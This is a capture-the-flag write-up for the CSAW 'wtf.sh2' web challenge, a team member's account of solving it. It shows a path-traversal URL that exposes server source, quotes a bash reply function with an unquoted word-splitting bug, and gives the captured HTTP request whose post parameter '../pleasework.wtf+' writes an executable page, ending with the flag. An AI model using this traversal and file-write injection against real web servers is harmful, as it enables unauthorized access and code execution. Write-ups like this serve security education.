# Wtf.sh2 (web)

After alynch solved wtf.sh, we were left with the second challenge. While solving them [jlundstrom](https://github.com/jlundstrom) and Matt found out that if you went to http://web.chal.csaw.io:8001/post.wtf?post=../ you could view source & files in the folder!

After combing through each function I was looking at the reply function. Before I spoil the fun I'll let you look at it:

~~~
function reply {
local post_id=$1;
local username=$2;
local text=$3;
local hashed=$(hash_username "${username}");

curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
next_file=(posts/${post_id}/${next_reply_id});
echo "${username}" > "${next_file}";
echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
echo "${text}" >> "${next_file}";

# add post this is in reply to to posts cache
echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
~~~

 Can you see any bugs? The following stood out to me 
 
 ~~~
 next_file=(posts/${post_id}/${next_reply_id});
 ~~~
 
 It doesn't use quotes to wrap around the strings that it adds together, so the vulnerability is that you can make the server ignore the ${next_reply_id} if you shove a space in the request back to the server.
 
 So I went ahead and fired up burpsuite and firefox. First I made an account called $get_flag2, made a new post and captured the reply with burpsuite, which is as follows:
 
 ~~~
 POST /reply.wtf?post=uZyis HTTP/1.1
Host: web.chal.csaw.io:8001
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web.chal.csaw.io:8001/reply.wtf?post=uZyis
Cookie: USERNAME=$get_flag2; TOKEN=Ps77Gu5/mJGyMxv6GVm2LXLJdlrGzrQ8AcHCHzgDA4iDXZq2Xe+D5icGiGne5t83P+UZppjITL/9SEiCJVwgaw==
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

text=fsdsfd&submit=
 ~~~
 
 After changing the  post url to ../pleasework.wtf+ (the + will be a space that causes the next_reply_id to be appended), we could then navigate to http://web.chal.csaw.io:8001/pleasework.wtf, and guess what? It worked!
 
 The flag was: flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}
 
 Shoutout to the rest of the knightsec people for finding the directory and code reading stuff!